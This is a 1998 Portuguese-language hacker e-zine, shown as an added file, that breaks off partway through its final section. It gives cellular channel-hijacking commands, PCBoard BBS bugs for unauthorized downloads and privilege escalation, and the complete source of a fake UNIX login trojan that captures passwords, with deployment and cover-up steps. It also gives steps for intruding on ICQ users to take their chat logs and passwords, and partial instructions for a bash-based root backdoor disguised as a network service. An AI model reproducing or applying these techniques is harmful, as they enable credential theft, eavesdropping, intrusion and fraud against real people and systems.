@@ -1,0 +1,993 @@
+	                                  zZZZZZZZZZZZZZZZz
+	                                                zZ
+	    cCCCCCCCCc         sSSSSSSSSs              zZ
+	  cCCCCCCCCCCCCc     sSSSSSSSSSSSSs           zZ
+	 cCCC       CCCCc   sSSS       SSSSs         zZ
+	cCCCc               SSSSs                   zZ  II NNn  NN EEEEE
+	CCCCC                SSSSSSSSSSs           zZ   II NNNn NN EE
+	CCCCC                   SSSSSSSSSs        zZ    II NN NnNN EEEE
+	CCCCC                          SSSSS     zZ     II NN  NNN EE
+	 CCCC       CCCCc   sSSSS       SSSS    zZ      II NN   NN EEEEE
+	  CCCCCCCCCCCCCC     SSSSSSSSSSSSSS    zZ
+	    CCCCCCCCCC         SSSSSSSSSS     zZ
+	                                     zZ
+	                                    zZ
+	                                  zZZZZZZZZZZZZZZZZz
+
+    PS: Se você não conseguiu lêr direito, aí em cima tah escrito CSZine.
+
+	Novo E-Mail da revista : cszine@hotmail.com
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=Cheat=Struck-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+	Introdução:
+
+	A maioria das pessoas que leêm a zine sempre pulam a introdução (a
+parte chata), por isso eu decidi que ela não será mais uma seção da zine, as-
+sim como a preview. Em compensação, agora o bonus que sempre vinha no final
+da zine(escondidinho) será uma seção, a ultima.
+	A revista continua com 10 seções, garantindo o mantimento da Invasão
+de privacidade, VIRII, Hack - the art, Phreaking e bugz. Se você acha que a
+zine poderia ter uma seção de Anarchy ou qquer outra coisa que você goste, me
+escreva uma matéria para ser publicada, que talvéz assim você consiga dar a
+iniciativa que falta para os outros.
+	Não precisam ter medo de me escrever. Eu vou apenas avaliar a sua ma-
+téria e então publicarei-a(se gostar). Não irei xingar a mãe de ninguém, nem
+te floodar, nukar, queimar seu modem, nem fazer qquer outra ameaça dessas que
+apenas lamers fazem. Se você quer saber se a matéria será publicada, apenas
+espere e veja se ela saiu na mais recente edição.
+
+	Estou fazendo um novo e-mail apenas para os caras que querem falar
+sobre a revista, e tb construindo uma nova page na geocities(vamo vê se dessa
+vez dura). Por enquanto me contatem no irc.via-rs.com.br, #CSCHANNEL.
+
+-=-=-=-=-=-=-=-=-=-=--=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+	Indice
+
+Seção:	Matéria:	Assunto:		Autor:		Nota:
+
+1.	Phreaking		Telefonia celular	Cheat Struck	10,0
+2.	Bugz			Bugz para PCboard	Anonymous	10,0
+3.	Programação		Tutorial de pascal	Cheat Struck	9,5
+4.	Virii			Trojam para UNIX	Cheat Struck	9,5
+5.	NeWs			Noticias Quentissimas	Cheat Struck	8,5
+6.	Invasão de privacidade  Invasão via ICQ		Cheat Struck	9,5
+7.	Vivendo			Boliche de graça	Cheat Struck	9,5
+8.	Crackerz		Mexendo no mIRC		Cheat Struck	9,0
+9.	Hack, the Art		Backdoor's novissimas	Cheat Struck	10,0
+10.	¡Bonus!			Serviços do TCP		Cheat Struck	9,0
+
+#############################################################################
+$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+######  1. Phreaking  #######################################################
+$$$$$$$              $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+
+	Bem alunos:
+	Vamos revêr o que vimos aula passada??
+	Tentamos entender direitinho como funciona os canais nas conversas
+telefonicas e descobrimos como entrar em um canal que esta sendo usado por 1
+outra pessoa. Nessa aula veremos como dominar o canal.
+
+	Para vêr o status do canal digite o comando 02# . Isso irá mostrar:
+
+XXX YYY
+
+	Onde XXX é o numero decimal do canal. YYY é a leitura RSSI do canal.
+	Aperte * para ver os próximos dados. Aparecerá algo tipo:
+
+1100001
+
+	Agora vamos entender o que significa:
+
+	1   1   0   0   0   0   1
+	|   |   |   |   |   |   |
+	|   |   |   |   |   |   +----->transmissor de audio mudo.
+	|   |   |   |   |   |
+	|   |   |   |   |   +----->receptor de audio ligado.
+	|   |   |   |   |
+	|   |   |   |   +----->Modo do canal(voice).
+	|   |   |   |
+	|   |   |   +----->Nível de força maxima.
+	|   |   |
+	|   |   +----->Tone desligado.
+	|   |
+	|   +----->CARRIER ligado.
+	|
+	+----->6Mhz de frequencia SAT.
+
+	Iremos nos consentrar nesse segundo menu de dados. Tecle # p/ sair.
+	As configurações iniciais do seu celular são:
+
+3000111
+
+	Ou seja:
+
+	3   0   0   0   1   1   1
+	|   |   |   |   |   |   |
+	|   |   |   |   |   |   +----->transmissor de audio mudo.
+	|   |   |   |   |   |
+	|   |   |   |   |   +----->receptor de audio mudo.
+	|   |   |   |   |
+	|   |   |   |   +----->modo do canal(control).
+	|   |   |   |
+	|   |   |   +----->Nível de força maxima.
+	|   |   |
+	|   |   +----->Tone desligado.
+	|   |
+	|   +----->CARRIER desligado.
+	|
+	+----->sem frequencia SAT.
+
+	Agora, como nós mudamos essas configurações????????
+	Calma coelhinho. Vamos por parte:
+
+1. Como mudar a frequencia SAT????
+   Isso é algo extremamente importante nos EUA e outros paises que usam CT's
+digitais(no Brasil é usado CT's eletro-mecanicas). Se um phreaker conseguir
+enviar uma frequencia exata de 2,6Mhz consiguirá realizar a maior façanha
+phreak, ou seja obterá o resultado da Blue Box.
+   Você não poderá realizar essa façanha usando apenas o celular.
+   O mais próximo que vc poderá conseguir é 2610Hz de frequencia SAT porém p/
+a bluebox funcionar terão que ser 2600Hz cravados. Para descobrir como confi-
+gurar a fase SAT procure pelo comando 52# ou 25# nas edições anteriores da
+csz.
+
+2. Como ligar e desligar o carrier????
+   O comando 05# liga o transmissor de carrier e o 06# desliga.
+
+3. Como ligar/desligar o tone????
+   O comando 15# desligará o tone e o 14# obterá 10KHz de tone.
+   Para ativar o high tone use 28# e para desativar use 29#.
+   Para ativar o low tone use 30# e para desativar use o 31#
+
+4. Como mudar o nível de força???
+   Use o comando 12*# , onde o * pode variar de 0 à 7. 0 é a força maxima e 7
+é a força minima. A força maxima coresponde a 3Watts.
+
+5. Como mudar o modo do canal????
+   Para mudar o modo do canal para voice use o comando 17# e para mudar para
+control use 16#.
+
+6. Como ativar/desativar o receptor de audio???
+   O comando 07# deixa o receptor mudo e o 08# ativa-o.
+
+7. Como ativar/desativar o transmissor de audio???
+   O comando 09# deixa desliga e o 10# liga-o. Atenção! É fundamental que o
+transmissor esteja desligado, caso contrario as pessoas que estiverem conver-
+sando no canal notaram ruídos ou as suas falas.
+
+	Bom amiguinhos, a aula por hoje está acabando. Se vc quer saber como
+tira os maluco dos canais ou qquer outra coisa phreaker desse tipo, faça uma
+BlueBox e viage para os Estados Unidos. :¬)
+
+#############################################################################
+$$$$$$$         $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+######  2. Bugz  ############################################################
+$$$$$$$         $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+
+-=-==--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=
+
+	Bugz para PCBoard
+
+-=-=-=-=--=-=-=-=-==--=-=-=-=-==-=-=-=-=-=-=-==-=-==-=-=-==-=-=-==-=-=--=-=-=
+
+	Antes de começar a descrever os bugs, gostaria de explicar algo meio
+que incrivel no PCBoard: a estrutura de BATCH é falha, pois todo arquivo que
+você vai retirar ou jé está marcado para retirar, cai numa lista. O PCB é
+'burro' no ponto de vista de seleção dos arquivos. Tais como pacotes qwks,
+reps, ups, arquivos de dir. e blts...
+
+BUG #1: Macros podem ser usadas mesmo sem nivel de SysOP.
+
+	O PCBoard possui algumas macros, tais como @cls@, @alias@, no entanto
+, estas são relativamente pertencentes somente a usuarios com nivel de SysOP
+(setado no pcbsetup, 'minimum sec. for sysop').
+	Mas você pode usar estas macros! Ao usar o comando D ou U, experimen-
+te digitar no lugar do nome do arquivo @who@, ou @user@, isto pode ser util
+em BBSs que não permitem estes comandos. Outro detalhe: imaginou se colocar
+um @pos@ e chamar um PPE, que disastre seria?! Hummm...
+
+BUG #2: Downloads sem usar o comando D.
+
+	Você pode fazer downloads sem ter acesso ao comando D, basta fazer o
+seguinte: ao inves de flagear um arquivo para download no modo padrao, tipo
+FLAG ou com a barra de espacos, use o comando:
+
+L *.* 1 D NS
+
+	Onde...
+
+L: Procura de arquivos
+*.*: Todos os arquivos
+1: Area
+D: Retira os arquivos encontrados
+NS: NonStop
+
+	Você pode modificar a parte acima, conforme o seu interesse. Bom, a-
+gora continuando... Se você der o comando D, os arquivos estarão marcados...
+Mas como se você não pode fazer o download?!
+	Esqueceram que o PCBoard tem uma pessima estrutura de BATCH de files?
+Tudo o que você guarda fica no mesmo BAT. De agora em diante, você tem duas
+saidas para pegar estes arquivos:
+
+R L QW  = Voce vai pegar um pacote QWK com as ultimas msgs... Só que este pa-
+          cote seria mais 1 arquivo no batch, resumindo, você recebe o pacote
+          QWK mais os arquivos anteriormente marcados.
+
+B D A   = No caso do BBS permitir download de boletins, você pega os boletins
+          mais os arquivos marcados.
+
+BUG #3: Falha na verificacao de tempo ao marcar arquivos.
+
+	Se você marcar arquivos pela forma descrita acima, com o comando L,
+você vai estar 'dizendo' ao PCBoard: "olha sistema, quando eu for fazer o
+download, você me manda estes arquivos!". Ou seja, eles não são marcados ime-
+diatamente...
+	Se você for dar download e faltar tempo para alguns arquivos, sim-
+plesmente aborte o d/l (download) no momento em que aparecer: "aborta, conti-
+nua, goodbye, protocol"... E então, volte para o menu e use o mesmo comando.
+	Quando voce for fazer o d/l novamente, os arquivos já marcados apare-
+cerão da seguinte forma: "duplicates file..." ou seja, você tentou marcar
+duas vezes o mesmo arquivo, certo? Acontece que o PCB nao conta o tempo des-
+tes arquivos duplicados, ou seja, ele vai marcar + xxx arquivos com o tempo
+restante.
+
+	Por exemplo: se você tinha 60 minutos e usar este comando por umas 6
+vezes, voce pode fazer uma transferencia de 360 min.!!! Belezaaaaa!
+
+BUG #4: Portas externas sao 'burras'.
+
+	Se você entrar no mail, e colocar uma conferencia com bastante mensa-
+gens e desconectar do BBS no meio, você conecta e está com o seu tempo nova-
+mente inteiro.
+	Isto se explica pois: o PCB gera um arquivo USERS.SYS ou DOOR.SYS
+para poder gerar a porta, no retorno, ele le este arquivo e verificar quanto
+tempo o usuario ficou nesta mesma, subtrai do tempo inicial do usuario antes
+de entrar na porta e do tempo da conexão.
+	Imagina se você desconectar e o tempo ficar negativo... O PCB é meio
+que animal e então você fica com o seu tempinho zerado! ehehe =)
+
+	Não só no mail, tente portas de jogos! Não tem coisa melhor!!!
+
+BUG #5: PPEs
+
+	Se você fizer o upload de um PPE, o uploader não o reprova... No en-
+tanto, se você chamar o PPE uploadeado usando aquelas macros descritas acima,
+vc pode executar o PPE na boa e subir seu nível... Eh questão de estudar...
+
+-=-=-=-=-=-==-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-==-=-=-
+
+	Atenção! Os dados acima Não são de minha autoria e não sei quem os
+escreveu, por isso me referi ao autor como anonymous.
+	O nick dele não é Anonymous.
+
+#############################################################################
+$$$$$$$                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+######  3. Programação  #####################################################
+$$$$$$$                $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-==-
+
+	Tutorial de Pascal (parte 1)
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=
+
+	Vamos pular akela chatice de "Linguagem Pascal" ou "Porq TPascal?" e
+vamos ao que enteressa.
+
+	»»»»»»»»»»»»»»» Inicio «««««««««««««««
+
+	Essa sempre é a pior parte. Ter que explicar detalhadamente a estru-
+tura dos programas em java. Então aki vai um exemplo, simples e claro. Este
+exemplo foi tirado de um tutorial onde o autor não é especificado.
+	Foram tirados alguns detalhes e acressentados outros de minha parte,
+na fonte original.
+	Antes de ver o exemplo vc deve entender que o programa em pascal se
+divide em 3 partes importantes: O cabeçalho, a Area de definições e o corpo.
+
+--------------------Exemplo.pas----------------------------------------------
+
+    { Tudo que estiver entre chaves são comentários e não são levados em
+      conta pelo compilador.}
+
+    Program Primeiro_Exemplo; { este e o cabecalho do programa }
+    USES Crt;   { Aqui estou utilizando uma UNIT, chamada CRT. }
+
+    {Aki termina o cabeçalho do programa e começa a area de definições }
+
+Label			{ Esta' é a area de definições para labels. Todas as
+			  labels q vc usar no programa, devem aparecer aki }
+
+Const			{ Nesta area podemos definir todas as constantes que
+			  quisermos utilizar no programa }
+
+          hoje_é = '4 de outubro de 1998';
+
+Type			{ Aki é permitido definir novas variaveis }
+
+Var			{ Todas as variaveis pre-definidas que forem usadas
+			  no programa devem ser declaradas aki }
+
+        dia           : integer;
+        ano           : integer;
+        mes           : string[3];
+	l             : integer;
+
+Procedure		{ Nesta area é necessario definir todas as procedures
+			 que você for usar mais tarde }
+
+    Linha;
+    Begin
+       For l:=1 to 80 do Write('-');
+    end;
+
+Function 		{ Aki serão definidos as funções a mais. }
+
+       	{ Aqui começa o corpo do programa }
+	{ As functions e procedures serão explicados mais tarde }
+
+    Begin
+       ClrScr;
+       Linha;		{ Executa a procedure linha(que foi criada a cima }
+       Writeln('Hoje é : ',Hoje_é);
+       Linha;
+       Write('Que o dia vc nasceu(DIA)? ');
+       Readln(dia);
+       Linha;
+       Write('Qual o mes do seu aniversario ? ');
+       Readln(mes);
+       Linha;
+       Writeln('Em q ano você nasceu?? ');
+       Readln(ano);
+       Linha;
+       Write('Good Bye!');
+    End.
+
+--------------------------------Exemplo.pas----------------------------------
+
+	»»»»»»»»»»»»»»» Explicação das partes do programa «««««««««««««««
+
+» Cabeçalho:
+  Sempre aparece no topo do programa iniciado pelo comando "program". Tipo:
+
+	Program novo_projeto;
+	        ^^^^^^^^^^^^--Este é um nome pré-fixado no programa.
+
+  Logo em seguida deve ser indicada a UNIT que serah usada pelo programa.
+UNIT é uma biblioteca de functions e procedures. O comenado usado deve ser o
+USES. Tipo:
+
+	Uses Dos;
+	     ^^^--Este é o nome da UNIT q serah usada.
+
+» Area de definições:
+  A area de definições é sub-dividida em algumas partes exenciais e outras
+nem tão importantes. As principais areas foram mostradas no exemplo acima e
+explicadas.
+  Se você não for usar alguma dessas areas, não precisará indicalas no pro-
+grama. Tipo a area "Label" não precisaria ter aparecido.
+
+» Corpo:
+  O corpo do programa é onde serão indicadas todas as funções que o programa
+deverah seguir para realizar a sua função. Para marcar o fim do programa use
+o cmd "End" seguido de um ponto. Tipo:
+
+	End.
+
+	»»»»»»»»»»»»» Dados pré-fixados ««««««««««««««
+
+	As vezes quando você trabalha com variaveis, tem que usa-los. Mas se-
+rah que vc os conhece bem???
+
+* CHAR = Todos os caracters cherados pelo teclado.
+* BOOLEAN = True or False.
+* STRING = Uma palavra
+  Se vc colocar tipo assim: STRING[5] . Isso significa que o valor é uma pa-
+  lavra de 5 caracteres.
+* SHORTINT = até 3 caracteres(equivale aos sistemas de 8bits)
+* INTEGER = até 5 caracteres(equivale aos sistemas de 16bits)
+* LONGINT = até 10 caracteres(equivale aos sistemas de 32bits)
+* BYTE = 1 a 3 caracteres
+* WORD = 1 a 5 caracteres
+
+	Existem mais alguns mas é chato ficar explicando isso por tanto vamos
+ver alguns exemplos :
+
+	Var
+	    Seu_Nome:STRING;
+
+	Begin
+	    ClrScr;
+	    Writeln('Qual o seu nome? ');
+	    Readln(Seu_Nome);
+	End.
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=
+
+	Fim da parte 1
+
+=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-
+
+#############################################################################
+$$$$$$$          $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+######  4. Virii  ###########################################################
+$$$$$$$          $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+
+       Vamos deixar para criar os virus em pascal asim que acabar o tutorial.
+Por enquanto vamos ver um trojan para UNIX.
+	O que ele faz é simular um login, o cra que executa-lo encontra-rá a
+seguinte tela:
+
+Tiburon Systems 4.2bsd / System V (shark)
+
+login: babaca
+Password:
+
+Login Incorrect
+
+	Aí ele pensa que deve ter digitado a senha errada, digita de novo e
+entra no sistema. Porém akela senha que ele digitou estava certa e foi grava-
+da em um de seus arquivos. Note que este trojam é para um sistema bsd4.2, al-
+tere as primeiras linhas da fonte(antes de compila-la) para o seu sistema.
+	Use os seguintes cmds para compila-lo:
+
+cc horse.c -lcurses -ltermcap
+mv a.out horse
+
+	Agora crie um arquivo chamado trap e coloque esses comandos:
+
+horse
+login
+
+	Para executar o trap digite:
+
+source trap
+
+	Agora atualmente veja o file stuff no seu diretório home. Copie-os e
+depois delete o file. Ele pode ser muito incriminante se o root le-lo.
+	Se você entende de C, pode alterar a fonte como preferir. Porém se vc
+não sabe nada de C, não mexa aí que vc vai fazer merda! Essa fonte não fui eu
+quem fiz, mas funciona legal.
+
+----------horse.c------------------------------------------------------------
+
+/* A mensagem abaixo deve ser alterada para se parecer com a mensagem que
+ * o sistema imprime quando pronto.  Cada \n representa um carriage return
+ */
+
+define SYSTEM "\n\nTiburon Systems 4.2bsd UNIX (shark)\n\n"
+
+define LOGIN  "login: "
+
+define PASSWORD "password:"
+
+define WAIT 2
+
+define INCORRECT "Login incorrect.\n"
+
+define FILENAME "stuff"
+
+include
+include
+int stop();
+
+main()
+{
+char name[10], password[10];
+int i;
+FILE *fp, *fopen();
+signal(SIGINT,stop);
+initscr();
+printf(SYSTEM);
+printf(LOGIN);
+scanf("%[^\n]",name);
+getchar();
+noecho();
+printf(PASSWORD);
+scanf("%[^\n]",password);
+printf("\n");
+getchar();
+echo();
+sleep(WAIT);
+
+if ( ( fp = fopen(FILENAME,"a") )  != NULL ) {
+fprintf(fp,"login %s has password %s\n",name,password);
+fclose(fp);
+}
+
+printf(INCORRECT);
+endwin();
+}
+
+stop()
+{
+endwin();
+exit(0);
+}
+
+----------horse.c------------------------------------------------------------
+
+#############################################################################
+$$$$$$$         $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+######  5. NeWs  ############################################################
+$$$$$$$         $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+
+	Noticias Quentes!!!!!
+
+_.'^'._.'^'._.'^'._.'^'._ HoMe PaGe Da MoS zInE hAcKeD _.'^'._.'^'._.'^'._.'^
+
+	Pois eh! Akeles que se diziam os maiores hackers do mundo, foram hu-
+milhados publicamente por um hacker chamado sm0g. Para ver a hp hackeada vá
+ao url members.xoom.com/moszine. A msg colocada no lugar da hp original foi:
+
+"Opz.. infelizmente o melhor grupo hacked do pais teve de ser desconectado
+devido a problemas tecnicos.. Em breve essa pagina vai tambem estar na seção
+de "Hacked Hosts" da MOS he he... se eles ainda tiverem a moral de continuar
+essa merda de grupo depois disso..
+
+Entao voces sao os bons? Os melhores do país? Wiz4rd voce acha legal roubar
+ideia dos outros? Humildade colega.. humildade..
+
+O codigo do B2 (q ta com  pau porq eu nao terminei, mas tu é tao otario que
+nem isso sacou..) é meu.
+
+A ideia foi minha.. e vc é uma puta que gosta de aparecer, e pensa que é o
+maximo.. pois bem, aproveita agora e tenta hackear esse sisteminha d merda,
+porq eu estou com uma  vontade enorme de deixar essa pagina aqui o resto da
+vida.
+
+Bah.. foda-se essa bosta de Masters Of Shadows.
+
+                                                                  sm0g"
+
+._.'^'._.'^'._.'^'._.'^'._.'^'._ CsZiNe TiPs _.'^'._.'^'._.'^'._.'^'._.'^'._.
+
+	A CSZine fez mais sucesso do que eu imaginei. Por isso estou dando
+maior atenção a ela. Aki estão os lugares onde vc pode encontrar a CSZine e
+o autor Cheat Struck(eu):
+
+irc.via-rs.com.br
+ #CSCHANNEL			=	Canal no IRC.
+
+16623675			=	UIN do ICQ.
+
+cszine@hotmail.com		=	E-Mail.
+
+www.geocities.com/?????		=	HomePage (Está saindo).
+
+_.'^'._.'^'._.'^'._ "ViRuS" GoOd TiMeS cAuSa PrObLeMaS _.'^'._.'^'._.'^'._.'^
+
+	Você jah deve ter recebido uma msg ou pego algum arquivo .txt que di-
+zia carregar um virus chamado Good Times, não? Pois eu jah, e conheço o autor
+desse 'virus'.
+	O nick do autor é DARK ANGEL, embora eu nunca tenha falado com ele eu
+jah lí varios de seus textos, inclusive o guia de criação de vírus, o qual
+mesmo sendo em formato texto puro dizia conter um virus.
+	Faz pouco tempo, acho que no dia 29 de julho deste ano(1998) saiu uma
+matéria sobre estes virus falsos no caderno de informatica da ZeroHora(eleito
+o melhor jornal em 1996, acho), e este nome estava citado.
+	Eu não me lembro quantas besteiras ouvi falar que ele faz, não irei
+citar nenhuma pois posso me confundir com outros virus "falsos".
+	Este "virus"(entre aspas porq não é propriamente um virus) é transmi-
+tido por e-mail(se vc acredita nisso...) e arquivos com extenção .txt segundo
+as informações da ZH e diz causar coisas impossiveis de acontecerem.
+
+_.'^'._.'^'._.'^'._.'^'._.'^'._.'^'._.'^'._.'^'._.'^'._.'^'._.'^'._.'^'._.'^'
+
+#############################################################################
+$$$$$$$                           $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+######  6. Invasão de privacidade  ##########################################
+$$$$$$$                           $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+
+-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+Ivasão via ICQ
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+	Esse metodo é direcionado a akeles que ainda usam o ruindows, mas tb
+funciona no linux. Sigua os passos:
+
+1. Descobrindo o IP:
+	Vá ao prompt do DOS e digite ARP -A
+
+2. Descobrindo a porta:
+	O ICQ usa portas acima de 500.
+	Rode o programa ICQ PORT SNIFF e descubra a porta.
+
+3. Invadindo...
+	Use um programa de telnet e conecte-se ao ip do usuário pela porta q
+vc detectou.
+
+4. O que fazer lah??
+	Os arquivos do ICQ que vc pode pegar são os .dat e .idx no sub-dir DB
+dentro do diretório em que o ICQ foi instalado (normalmente Arquivos de Pro-
+gramas/ICQ). Lah estaram todas as conversas e dados do maneh.
+	Veja tb se por acaso ele não colocou a senha(DELE) em algum file e/ou
+se ele seja cadastrado no provedor da IBM procure pelo arquivo REGINFO.TXT no
+diretório /IBMNET.
+	Vc Também pode mandar virus, etc...
+	Agora se ele estiver usando um s.o. UNIX as coisas ficam + dificeis.
+
+-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+#############################################################################
+$$$$$$$            $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+######  7. Vivendo  #########################################################
+$$$$$$$            $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+
+	Lembra dakela matéria que falava como roubar tv a cabo?? Se ele fosse
+publicado hoje estaria nessa seção.
+	Eehhh... Essa seção não falará sobre computadores ou sobre telefonia,
+falará sobre os outros aparelhos eletronicos que vc encontra na sua frente e
+gostaria de saber algo a mais sobre eles.
+	Como não existe nome para a ação de burlar os tróço q aparecem aki e
+eu não me considero a altura de dar um nome para isso, o nome da seção serah
+vivendo pelo fato de que agente encontra isso no nosso dia-a-dia.
+	Não tenho muito o que colocar nessa seção, pra falar a verdade soh
+tenho materia para essa e a próxima edição. Por isso eu gostaria que vocês me
+mandassem as suas dicas, se quizerem q essa seção continue. Todo mundo desco-
+bre algo novo nos dias de hoje.
+
+-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+	Jogando boliche de graça
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+	Essa dica não deve funcionar em todas as makinas de boliche. Descobri
+ela um dia em que estava jogando boliche com meu pai e meus brothers e ví um
+daqueles karinhas que cuidam das maquinas, usar esse truque para jogar d gra-
+ça. Ele funciona assim.
+
+	Quando a familha que estava no seu lado parar de jogar, espere até
+surgir uma tela escura, informando o fabricante.
+	Veja se a barra estah limpa(se não tem nenhum dakeles maneh q cuidam
+das maquinas por perto).
+	Aperte meio de canto o botão de "Split" no canto inferior direito da
+makina ao lado(a que estah temporariamente desligada).
+	Isso executa um teste na memória da maquina (pelo menos foi isso que
+o cara me explicou), abaixando os pinos por alguns segundos e depois os reco-
+lhe novamente e desliga a maquina.
+	Esses segundos são suficiente para vc jogar uma bola. UMA BOLA. Mas
+faça rapidinho para que ninguem veja. Se algum palhaço o vir fazendo isso po-
+de te dar um mixão ou acressentar na sua consumação.
+	Descobri esse "truquezinho" nas maquinas KOOP(acho q é isso) do Ame-
+ricam Bowling do BOURBOM de Porto Alegre. Se não funcionar na sua cidade a
+unica coisa a fazer é se lamentar por não ter nascido numa cidade tão maneira
+quanto a minha.
+
+-=-=-=-=-=-=-=-=-=-=-==-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+
+#############################################################################
+$$$$$$$             $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+######  8. Crackerz  ########################################################
+$$$$$$$             $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+	Mexendo no seu mIRC.
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+	O mIRC é um dos melhores(se não o melhor) programa de IRC jah visto.
+Porém é muito mole crackea-lo.
+	A algum tempo atraz ( em quanto eu tentava inventar um substituto ba-
+rato para a agua benta :¬) ) eu jah havia crackeado o mIRC descaradamente. Eu
+apenas abri o edit e mudei todos os locais que diziam mIRC32 para BitchX.
+	Isso éra apenas para enganar os carinhas que davam version e essas
+cosas. Você também pode fazer isso.
+	Apenas copie o mIRC32.EXE para um outro diretório com qquer outro no-
+me. Depois rode o edit e abra-o no modo hexadecimal(edit /70 nome.exe).
+	Se ao edita-lo aparecer a msg "Não é possivel modificar um arquivo
+somente leitura", veja as seguintes soluçoes: 1. Veja se o programa não está
+aberto. Se estiver, feche-o.  2. Veja se vc não usou o edit no modo somente
+leitura.  3. Veja os atributos do arquivo. Agora feche-o e abra-o novamente.
+
+	Se você for fazer um script para mIRC e quizer alterar o nome do mIRC
+para o nome do seu script faça o mesmo que eu fiz(descrito acima).
+	Vc também poderá traduzir o seu mIRC. Basta procurar por textos tipo:
+*** Not connected to server
+
+e substitua por:
+
+*** Voce nao esta conectado
+
+       Note que deve ter o mesmo numero de caracteres e não pode ter acentos.
+	Além disso também é possivel trocar o nome dos comandos do mIRC. Tipo
+"say" pode virar "diz" ou "mode" = "modo" ou "echo" = "acho"(bah).
+	Para fazer essas façanhas no mIRC não é precisso muito conhecimento
+crackz apenas um editor de texto como o edit do dos e meio neuronio em alpha.
+	Esse truque pode parecer meio troxa pros Kra que jah sabem um pouco
+de crackz mas eu insisti em não copia materia dos outros zines que falam so-
+bre crackz.
+	Preciso de kras entendidos no assunto para escrever essa seção.
+
+#############################################################################
+$$$$$$$                  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+######  9. Hack, the Art  ###################################################
+$$$$$$$                  $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
+#############################################################################
+
+	Outras BackDoor's.
+	Lembra dakelas backdoors q eu publiquei na edição passada?? Elas são
+do tipo caras de pau. Quer dizer, se chega um admin esperto na parada ja nota
+a backdoorzinha e a tranca.
+	Por isso nessa edição da zine vou colocar umas menos, escandalosas.
+
+"'"'"'"'"'"'"'" Utilizando serviços experimentais "'"'"'"'"'"'"'"'"'
+	Faça o seguinte:
+
+1. Procure pelo serviço courier no file /etc/services. A linha deve estar
+   assim:
+
+courier         530/tcp         rpc             # experimental
+
+   Se naum tiver adicione-o.
+
+2. Copie o /etc/bash para o /usr/sbin e renomeie-o para in.couried que eh o
+   nome do arquivo que se estabelece a conexão. Assim:
+
+# cp /bin/bash /usr/sbin
+# mv /usr/sbin/bash /usr/sbin/in.courierd
+# chmod a+x  /usr/sbin/in.courierd
+
